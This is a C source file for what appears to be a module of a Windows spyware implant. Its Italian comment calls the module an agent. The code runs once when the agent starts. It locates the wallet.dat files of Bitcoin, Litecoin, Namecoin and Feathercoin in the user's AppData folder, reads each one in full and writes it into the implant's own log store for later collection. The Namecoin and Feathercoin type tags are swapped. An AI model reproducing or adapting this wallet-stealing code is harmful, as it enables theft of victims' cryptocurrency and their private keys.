struct MoneyHeader {
#define MONEY_VERSION 2014010101
	DWORD version;
#define MONEY_BITCOIN 0x00
#define MONEY_LITECOIN 0x30
#define MONEY_FEATHERCOIN 0x0E
#define MONEY_NAMECOIN 0x34
	DWORD type;
	DWORD program_type;
	DWORD file_name_len;
};

void GetCurrency(WCHAR *currency_path, DWORD type)
{
	WCHAR expanded_currency_path[MAX_PATH];
	BYTE read_buff[2048];
	DWORD size = 0;
	struct MoneyHeader *additional_header;
	DWORD add_header_len, file_name_len;
	HANDLE hf, hsrc;

	if (!currency_path)
		return;

	if (ExpandEnvironmentStringsW(currency_path, expanded_currency_path, sizeof(expanded_currency_path)/sizeof(WCHAR)) == 0)
		return;

	file_name_len = wcslen(expanded_currency_path) * sizeof(WCHAR);
	add_header_len = sizeof(struct MoneyHeader) + file_name_len;
	additional_header = (struct MoneyHeader *) calloc(1, add_header_len);
	if (!additional_header)
		return;

	additional_header->version = MONEY_VERSION;
	additional_header->type = type;
	additional_header->program_type = 0;
	additional_header->file_name_len = file_name_len;
	memcpy(additional_header + 1, expanded_currency_path, additional_header->file_name_len);

	hsrc = FNC(CreateFileW)(expanded_currency_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hsrc == INVALID_HANDLE_VALUE) {
		SAFE_FREE(additional_header);
		return;
	}

	hf = Log_CreateFile(PM_MONEY, (BYTE *)additional_header, add_header_len);
	SAFE_FREE(additional_header);
	if (hf == INVALID_HANDLE_VALUE) {
		CloseHandle(hsrc);
		return;
	}

	while (FNC(ReadFile)(hsrc, read_buff, sizeof(read_buff), &size, NULL) && size>0) {
		if (!Log_WriteFile(hf, read_buff, size)) 
			break;
	}

	Log_CloseFile(hf); 
	CloseHandle(hsrc);
}

void GetMoney()
{
	GetCurrency(L"%APPDATA%\\Bitcoin\\wallet.dat", MONEY_BITCOIN);
	GetCurrency(L"%APPDATA%\\Litecoin\\wallet.dat", MONEY_LITECOIN);
	GetCurrency(L"%APPDATA%\\Namecoin\\wallet.dat", MONEY_FEATHERCOIN);
	GetCurrency(L"%APPDATA%\\Feathercoin\\wallet.dat", MONEY_NAMECOIN);
}

DWORD __stdcall PM_MoneyStartStop(BOOL bStartFlag, BOOL bReset)
{
	// Questo agente non ha stato started/stopped, ma quando
	// viene avviato esegue un'azione istantanea.
	if (bStartFlag && bReset) 
		GetMoney();

	return 1;
}

DWORD __stdcall PM_MoneyInit(JSONObject elem)
{
	return 1;
}

void PM_MoneyRegister()
{
	AM_MonitorRegister(L"money", PM_MONEY, NULL, (BYTE *)PM_MoneyStartStop, (BYTE *)PM_MoneyInit, NULL);
}
